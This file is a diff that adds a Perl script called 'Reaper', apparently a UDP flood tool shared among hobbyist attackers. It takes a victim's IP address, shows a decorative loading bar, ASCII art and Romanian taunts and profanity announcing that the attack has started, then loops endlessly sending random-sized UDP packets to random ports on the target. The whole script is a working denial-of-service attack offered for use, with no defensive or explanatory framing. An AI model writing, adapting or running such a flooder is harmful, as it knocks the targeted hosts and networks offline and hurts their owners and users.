@@ -1,0 +1,158 @@
+#!/usr/bin/perl
+
+use Socket;
+$ARGC = @ARGV;
+
+my ($ip, $port, $size, $time, $timer);
+
+#(Colors)
+$BLK = '[1;30m';
+$RED = '[1;31m';
+$GREEN = '[1;32m';
+$YELLOW = '[1;33m';
+$BLUE = '[1;34m';
+$MAGENTA = '[1;35m';
+$CYAN = '[1;36m';
+$WHITE = '[1;37m';
+$DARKYELLOW = '[0;33m';
+$DARKBLUE = '[0;34m';
+$DARKMAGENTA = '[0;35m';
+$DARKCYAN = '[0;36m';
+$DARKWHITE = '[0;37m';
+
+if ($ARGC !=1) {
+    printf "${GREEN}#####################################\n";
+    printf "${RED}#-->[Reaper]: perl reaper <IP victima> #\n";
+    printf "${GREEN}#####################################\n";
+    exit(1);
+}
+
+$ip = $ARGV[0];
+$port = $ARGV[0];
+
+socket(flud, PF_INET, SOCK_DGRAM, 17);
+
+$iaddr = inet_aton("$ip");
+
+$timer = 10;
+
+do {
+    if($timer ==10) {
+        system("clear");
+        printf "${GREEN}Reaper: [#######                                                        ]\n";
+        $timer = 9;
+        sleep(1.5);
+    }
+
+    if($timer ==9) {
+        printf "${GREEN}Reaper: [##############                                                 ]\n";
+        $timer = 8;
+        sleep(1.5);
+    }
+
+    if($timer ==8) {
+        printf "${GREEN}Reaper: [#####################                                          ]\n";
+        $timer = 7;
+        sleep(1.5);
+    }
+
+    if($timer ==7) {
+        printf "${GREEN}Reaper: [############################                                   ]\n";
+        $timer = 6;
+        sleep(1.5);
+    }
+
+    if($timer ==6) {
+        printf "${GREEN}Reaper: [###################################                            ]\n";
+        $timer = 5;
+        sleep(1.5);
+    }
+
+    if($timer ==5) {
+        printf "${GREEN}Reaper: [##########################################                     ]\n";
+        $timer = 4;
+        sleep(1.5);
+    }
+
+    if($timer ==4) {
+        printf "${GREEN}Reaper: [#################################################              ]\n";
+        $timer = 3;
+        sleep(1.5);
+    }
+
+    if($timer ==3) {
+        printf "${GREEN}Reaper: [########################################################       ]\n";
+        $timer = 2;
+        sleep(1.5);
+    }
+
+    if($timer ==2) {
+        printf "${GREEN}Reaper: [###############################################################]\n";
+        $timer = 1;
+        sleep(1.5);
+    }
+
+    if ($timer ==1) {
+        printf "${RED}Reaper a fost incarcat cu succes, tine-te bine!";
+        $timer = 0;
+        sleep(2);
+    }
+} while ($timer > 0);
+
+if($ARGV[1] ==0 && $ARGV[2] ==0) {
+    printf "${RED}          
+                                         . -----..__
+                     _                     []       ``-.._
+                  .'` `'.                  ||__           `-._
+                 /    ,-.\                 ||_ ```---..__     `-.
+                /    /:::\\               /|//}          ``--._  `.
+                |    |:::||              |////}                `-. \
+                |    |:::||             //'///                    `.\
+                |    |:::||            //  ||'                      `|
+                /    |:::|/        _,-//\  ||
+               /`    |:::|`-,__,-'`  |/  \ ||
+             /`  |   |'' ||           \   |||
+           /`    \   |   ||            |  /||
+         |`       |  |   |)            \ | ||
+        |          \ |   /      ,.__    \| ||
+        /           `         /`    `\   | ||
+       |                     /        \  / ||
+       |                     |        | /  ||
+       /         /           |        `(   ||
+      /          .           /          )  ||
+     |            \          |     ________||
+    /             |          /     `-------.|
+   |\            /          |              ||
+   \/`-._       |           /              ||
+    //   `.    /`           |              ||
+   //`.    `. |             \              ||
+  ///\ `-._  )/             |              ||
+ //// )   .(/               |              ||
+ ||||   ,'` )               /              //
+ ||||  /                    /             || 
+ `\\` /`                    |             // 
+     |`                     \            ||  
+    /                        |           //  
+  /`                          \         //   
+/`   re-wirite by barn        |       ||    
+`-.___,-.      .-.        ___,'        (/    
+         `---`   `'----```                                         
+
+    \n";
+    printf "${GREEN}[${RED}#${GREEN}] ${CYAN}/>> ${GREEN}barni#0001 - attack started on ${RED}$ip\n";
+    printf "${GREEN}[${RED}#${GREEN}] ${CYAN}/>> ${GREEN}atz belit pula pizdo'\n";
+    printf "${GREEN}[${RED}#${GREEN}] ${CYAN}/>> ${GREEN}si facui wa? l-ai bagat la culcare? =]\n";
+    printf "${GREEN}[${RED}#${GREEN}] ${CYAN}/>> ${GREEN}CTRL + C sa opresti monstrul\n";  
+}        
+
+if($ARGV[1] ==0 && $ARGV[2] ==0) {
+    goto randpackets;
+}
+
+randpackets: 
+for (;;) {
+  $psize = $size ? $size : int(rand(1064-128)+129) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flud, pack("a$psize","flud"), 0, pack_sockaddr_in($pport, $iaddr))
+}
